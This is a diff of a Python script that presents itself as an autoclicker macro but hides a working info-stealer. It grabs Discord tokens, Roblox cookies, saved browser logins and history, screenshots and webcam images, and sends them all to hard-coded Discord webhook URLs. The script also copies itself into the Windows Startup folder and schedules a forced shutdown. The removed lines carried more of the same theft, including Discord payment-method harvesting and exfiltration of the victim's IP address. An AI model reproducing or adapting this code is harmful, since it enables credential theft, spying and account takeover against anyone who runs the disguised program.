@@ -1,24 +1,25 @@
 import os
-import shutil
-import json
-import base64
-import win32crypt
-import requests
-import sqlite3
-import tempfile
-import datetime
-import urllib.request
-import re
 import subprocess
 import sys
+import platform
+import json
+import urllib.request
+import re
+import shutil
+import base64
+import datetime
+import win32crypt
+from Crypto.Cipher import AES
+import requests
+import ctypes
+import time
+from pynput import mouse, keyboard
+from pynput.keyboard import Listener as KeyboardListener
+from pynput.mouse import Listener as MouseListener
 import cv2
 import pyautogui
-import time
-import ctypes
-import keyboard
-from pynput import mouse, keyboard as pynput_keyboard
-from Crypto.Cipher import AES
-from pathlib import Path
+import sqlite3
+import tempfile
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
@@ -44,10 +45,34 @@ PATHS = {
     'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
     'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
     'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
+    'Iridium': LOCAL + '\\Iridium\\User Data\\Default',
+    'Vencord': ROAMING + '\\Vencord'
 }
 
-print("[*] please wait for 30 seconds")
+def schedule_shutdown():
+
+    current_time = time.localtime()
+    shutdown_time = time.strptime(time.strftime('%H:%M', current_time), '%H:%M')
+    shutdown_time = time.mktime((current_time.tm_year, current_time.tm_mon, current_time.tm_mday, shutdown_time.tm_hour + 1, shutdown_time.tm_min, 0, 0, 0, 0))
+
+    shutdown_time_str = time.strftime('%H:%M', time.localtime(shutdown_time))
+
+    command = f'schtasks /create /tn "ScheduledShutdown" /tr "shutdown /s /f" /sc once /st {shutdown_time_str}'
+
+    subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+def copy_exe_to_startup(exe_path):
+    """Copy the executable to the startup folder"""
+    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    destination_path = os.path.join(startup_folder, os.path.basename(exe_path))
+
+    if not os.path.exists(destination_path):
+        shutil.copy2(exe_path, destination_path)
+
+exe_path = os.path.abspath(sys.argv[0])
+copy_exe_to_startup(exe_path)
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1438070885729697844/MST6CL5c-1VKQAbdFc0-ken7K5dUHn7A6mp11dDoPSCr6XMZHmNUbxjYpEabpCYAYCLW"
 
 def getheaders(token=None):
     headers = {
@@ -55,7 +80,7 @@ def getheaders(token=None):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
     }
 
-    # Check if the operating system is Windows 11
+    
     if sys.platform == "win32" and platform.release() == "10.0.22000":
         headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203"
 
@@ -117,13 +142,11 @@ def retrieve_roblox_cookies():
         decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
         decrypted_text = decrypted_cookies.decode('utf-8', errors='ignore')
 
-        send_to_discord(f"\n```\n{decrypted_text}\n```")
-
+        return decrypted_text
     except Exception as e:
-        send_to_discord(f"Error retrieving Roblox cookies: {e}")
+        return str(e)
 
 def send_to_discord(message):
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1437209574556958722/iRtGtNbNqGsoPNxgyRO1WY7A8EbIvnsQertCFEpRzVU2l93cQkxTTbX68cOp1BuSjjPH"  # Replace with your actual webhook URL
     payload = {"content": message}
     response = requests.post(WEBHOOK_URL, json=payload)
     if response.status_code == 204:
@@ -141,7 +164,7 @@ def get_history_path(browser):
         profile_folders = next(os.walk(profiles_path))[1]
         if not profile_folders:
             return None
-        profile_folder = profile_folders[0]  # Get the first profile folder
+        profile_folder = profile_folders[0]  
         return os.path.join(profiles_path, profile_folder, "places.sqlite")
     elif browser == "Brave":
         return os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "History")
@@ -198,7 +221,6 @@ def save_to_file(browser, history):
     return filename
 
 def send_file_to_discord(file_path, message="Screenshot from victims PC"):
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1437209574556958722/iRtGtNbNqGsoPNxgyRO1WY7A8EbIvnsQertCFEpRzVU2l93cQkxTTbX68cOp1BuSjjPH"
     with open(file_path, 'rb') as file:
         files = {'file': file}
         data = {'content': message}
@@ -218,7 +240,7 @@ def get_login_path(browser):
         profile_folders = next(os.walk(profiles_path))[1]
         if not profile_folders:
             return None
-        profile_folder = profile_folders[0]  # Get the first profile folder
+        profile_folder = profile_folders[0]  
         return os.path.join(profiles_path, profile_folder, "logins.json")
     elif browser == "Brave":
         return os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")
@@ -274,6 +296,7 @@ def get_browser_logins(browser, limit=100):
         return None
 
 def save_to_file(browser, logins):
+    
     desktop_path = os.path.join(os.path.expanduser("~"), "OneDrive", "Desktop")
     if not os.path.exists(desktop_path):
         desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
@@ -304,68 +327,7 @@ def take_screenshot(filename='screenshot.png'):
     screenshot.save(filename)
     return filename
 
-def list_applications_in_folders():
-    # Get the path to the Downloads and Desktop folders
-    downloads_path = Path.home() / 'Downloads'
-    desktop_path = Path.home() / 'OneDrive' / 'Desktop'
-
-    # Function to list files and directories in a given path
-    def list_items(path):
-        items = []
-        for item in path.iterdir():
-            if item.is_file() or item.is_dir():
-                items.append(item.name)
-        return items
-
-    # List applications in the Downloads folder
-    downloads_items = list_items(downloads_path)
-
-    # List applications in the Desktop folder
-    desktop_items = list_items(desktop_path)
-
-    # Combine the lists and create a text file
-    all_items = downloads_items + desktop_items
-    with open('applications_list.txt', 'w') as file:
-        for item in all_items:
-            file.write(f"{item}\n")
-
-    return 'applications_list.txt'
-
-def send_file_to_discord_webhook(file_path, webhook_url):
-    with open(file_path, 'rb') as file:
-        files = {'file': file}
-        response = requests.post(webhook_url, files=files)
-        if response.status_code != 200:
-            print(f"Failed to send file: {response.status_code} {response.text}")
-
-def schedule_shutdown():
-    current_time = time.localtime()
-    shutdown_time = time.strptime(time.strftime('%H:%M', current_time), '%H:%M')
-    shutdown_time = time.mktime((current_time.tm_year, current_time.tm_mon, current_time.tm_mday, shutdown_time.tm_hour + 1, shutdown_time.tm_min, 0, 0, 0, 0))
-
-    shutdown_time_str = time.strftime('%H:%M', time.localtime(shutdown_time))
-
-    command = f'schtasks /create /tn "ScheduledShutdown" /tr "shutdown /s /f" /sc once /st {shutdown_time_str}'
-
-    subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-def send_ip_embed(webhook_url, ip_address):
-    embed = {
-        "title": "Victim's IP Address",
-        "description": f"```yaml\n{ip_address}```",
-        "color": 3092790
-    }
-    payload = {
-        "embeds": [embed]
-    }
-    headers = {
-        "Content-Type": "application/json"
-    }
-    response = requests.post(webhook_url, json=payload, headers=headers)
-    if response.status_code != 204:
-        print(f"Failed to send IP embed: {response.status_code} {response.text}")
-
-def execute_task():
+def main():
     checked = []
 
     for platform, path in PATHS.items():
@@ -386,83 +348,14 @@ def execute_task():
                     continue
                 res_json = json.loads(res.read().decode())
 
-                badges = ""
-                flags = res_json['flags']
-                if flags == 64 or flags == 96:
-                    badges += ":BadgeBravery: "
-                if flags == 128 or flags == 160:
-                    badges += ":BadgeBrilliance: "
-                if flags == 256 or flags == 288:
-                    badges += ":BadgeBalance: "
+                roblox_cookies = retrieve_roblox_cookies()
 
-                params = urllib.parse.urlencode({"with_counts": True})
-                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
-                guilds = len(res)
-                guild_infos = ""
-
-                for guild in res:
-                    if guild['permissions'] & 8 or guild['permissions'] & 32:
-                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
-                        vanity = ""
-
-                        if res["vanity_url_code"] != None:
-                            vanity = f"""; .gg/{res["vanity_url_code"]}"""
-
-                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
-                if guild_infos == "":
-                    guild_infos = "No guilds"
-
-                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
-                has_nitro = False
-                has_nitro = bool(len(res) > 0)
-                exp_date = None
-                if has_nitro:
-                    badges += f":BadgeSubscriber: "
-                    exp_date = res[0].get("current_period_end")
-                    if exp_date:
-                        exp_date = datetime.datetime.strptime(exp_date, "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
-
-                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
-                available = 0
-                print_boost = ""
-                boost = False
-                for id in res:
-                    cooldown = id.get("cooldown_ends_at")
-                    if cooldown:
-                        cooldown = datetime.datetime.strptime(cooldown, "%Y-%m-%dT%H:%M:%S.%f%z")
-                        if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
-                            print_boost += f"ㅤ- Available now\n"
-                            available += 1
-                        else:
-                            print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
-                    boost = True
-                if boost:
-                    badges += f":BadgeBoost: "
-
-                payment_methods = 0
-                type = ""
-                valid = 0
-                for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
-                    if x['type'] == 1:
-                        type += "CreditCard "
-                        if not x['invalid']:
-                            valid += 1
-                        payment_methods += 1
-                    elif x['type'] == 2:
-                        type += "PayPal "
-                        if not x['invalid']:
-                            valid += 1
-                        payment_methods += 1
-
-                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
-                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
-                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
                 embed_user = {
                     'embeds': [
                         {
                             'title': f"**New user data: {res_json['username']}**",
                             'description': f"""
-                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
+                                User ID:```\n {res_json['id']}\n```\nIP Info:```\n {getip()}\n```\nUsername:```\n {os.getenv("UserName")}```\nToken Location:```\n {platform}```\nToken:```\n{token}```\nRoblox Cookies:```\n{roblox_cookies}```""",
                             'color': 3092790,
                             'footer': {
                                 'text': "Made By Ryzen"
@@ -475,23 +368,19 @@ def execute_task():
                     "username": "Sex Offender",
                 }
 
-                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1437209574556958722/iRtGtNbNqGsoPNxgyRO1WY7A8EbIvnsQertCFEpRzVU2l93cQkxTTbX68cOp1BuSjjPH', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
-            except urllib.error.HTTPError or json.JSONDecodeError:
+                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1438070885729697844/MST6CL5c-1VKQAbdFc0-ken7K5dUHn7A6mp11dDoPSCr6XMZHmNUbxjYpEabpCYAYCLW', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+            except (urllib.error.HTTPError, json.JSONDecodeError):
                 continue
             except Exception as e:
+                print(f"ERROR: {e}")
                 continue
 
-    # Collect Roblox cookies
-    retrieve_roblox_cookies()
-
-    # Collect browser history
+    
     browsers = ["Chrome", "Firefox", "Brave", "Edge", "Zen", "Opera", "Opera GX"]
     installed_browsers = [browser for browser in browsers if is_browser_installed(browser)]
 
     if not installed_browsers:
         return
-
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1437209574556958722/iRtGtNbNqGsoPNxgyRO1WY7A8EbIvnsQertCFEpRzVU2l93cQkxTTbX68cOp1BuSjjPH"  # Replace with your actual webhook URL
 
     created_files = []
 
@@ -504,7 +393,7 @@ def execute_task():
         else:
             pass
 
-    # Collect browser logins
+    
     for browser in installed_browsers:
         logins = get_browser_logins(browser, limit=200)
         if logins:
@@ -514,7 +403,7 @@ def execute_task():
         else:
             pass
 
-    # Take screenshots
+    
     screenshot_paths = []
     for i in range(1):
         screenshot_path = take_screenshot(f'screenshot_{i+1}.png')
@@ -525,7 +414,7 @@ def execute_task():
     for path in screenshot_paths:
         delete_file(path)
 
-    # Capture camera image
+    
     image = capture_image()
     if image is not None:
         image_path = 'captured_image.jpg'
@@ -533,22 +422,133 @@ def execute_task():
         send_file_to_discord(image_path, message="Camera Image")
         created_files.append(image_path)
 
-    # Cleanup: Delete all created files
+    
     for file_path in created_files:
         delete_file(file_path)
 
-    # Delete Roblox cookies file
+    
     roblox_cookies_path = os.path.join(os.getenv("TEMP", ""), "RobloxCookies.dat")
     delete_file(roblox_cookies_path)
 
-    # Get public IP and send to Discord
-    ip_address = getip()
-    send_ip_embed(WEBHOOK_URL, ip_address)
-
 if __name__ == "__main__":
-    execute_task()
+    main()
     schedule_shutdown()
-    file_path = list_applications_in_folders()
-    send_file_to_discord_webhook(file_path, 'https://discord.com/api/webhooks/1437209574556958722/iRtGtNbNqGsoPNxgyRO1WY7A8EbIvnsQertCFEpRzVU2l93cQkxTTbX68cOp1BuSjjPH')
 
-input("[*] Press Enter To Exit")
+PUL = ctypes.POINTER(ctypes.c_ulong)
+
+print("[*] Ryzen's AP macro\n")
+time.sleep(2)
+print("[*] Made by Ryzen\n")
+
+class MouseInput(ctypes.Structure):
+    _fields_ = [("dx", ctypes.c_long),
+                ("dy", ctypes.c_long),
+                ("mouseData", ctypes.c_ulong),
+                ("dwFlags", ctypes.c_ulong),
+                ("time", ctypes.c_ulong),
+                ("dwExtraInfo", PUL)]
+
+class Input(ctypes.Structure):
+    _fields_ = [("type", ctypes.c_ulong), ("mi", MouseInput)]
+
+MOUSE_DOWN_FLAGS = {
+    mouse.Button.left: 0x0002,
+    mouse.Button.right: 0x0008,
+    mouse.Button.middle: 0x0020,
+    mouse.Button.x1: 0x0080,
+    mouse.Button.x2: 0x0100,
+}
+MOUSE_UP_FLAGS = {
+    mouse.Button.left: 0x0004,
+    mouse.Button.right: 0x0010,
+    mouse.Button.middle: 0x0040,
+    mouse.Button.x1: 0x0080,
+    mouse.Button.x2: 0x0100,
+}
+
+def send_click(button):
+    down = Input(type=0, mi=MouseInput(0, 0, 0, MOUSE_DOWN_FLAGS[button], 0, None))
+    up = Input(type=0, mi=MouseInput(0, 0, 0, MOUSE_UP_FLAGS[button], 0, None))
+    ctypes.windll.user32.SendInput(1, ctypes.byref(down), ctypes.sizeof(down))
+    ctypes.windll.user32.SendInput(1, ctypes.byref(up), ctypes.sizeof(up))
+
+
+def detect_trigger():
+    trigger_key = None
+    trigger_type = None
+
+    def on_mouse_click(x, y, button, pressed):
+        nonlocal trigger_key, trigger_type
+        if pressed and trigger_key is None:
+            trigger_key = button
+            trigger_type = "mouse"
+            return False
+
+    def on_key_press(key):
+        nonlocal trigger_key, trigger_type
+        if trigger_key is None:
+            trigger_key = key
+            trigger_type = "keyboard"
+            return False
+
+    print("Press any key or mouse button to set your trigger...\n")
+
+    with MouseListener(on_click=on_mouse_click) as mouse_listener, \
+         KeyboardListener(on_press=on_key_press) as keyboard_listener:
+
+        while trigger_key is None:
+            time.sleep(0.05)
+
+    time.sleep(0.3)
+    return trigger_key, trigger_type
+
+
+trigger_key, trigger_type = detect_trigger()
+cps = float(input("Clicks per second: "))
+interval = 1 / cps
+active_button = mouse.Button.left
+
+
+try:
+    pressed_keys = set()
+
+    def on_key_press(key):
+        pressed_keys.add(key)
+
+    def on_key_release(key):
+        pressed_keys.discard(key)
+
+    key_listener = KeyboardListener(on_press=on_key_press, on_release=on_key_release)
+    key_listener.start()
+
+    if trigger_type == "mouse":
+        pressed_state = [False]
+
+        def on_click(x, y, button, pressed):
+            if button == trigger_key:
+                pressed_state[0] = pressed
+
+        with MouseListener(on_click=on_click) as listener:
+            while True:
+                if pressed_state[0]:
+                    send_click(active_button)
+                    time.sleep(interval)
+                else:
+                    time.sleep(0.01)
+    else:
+        while True:
+            if trigger_key in pressed_keys:
+                send_click(active_button)
+                time.sleep(interval)
+            else:
+                time.sleep(0.01)
+
+except KeyboardInterrupt:
+    pass
+finally:
+    try:
+        key_listener.stop()
+    except:
+        pass
+
+input("\nPress Enter to Exit")
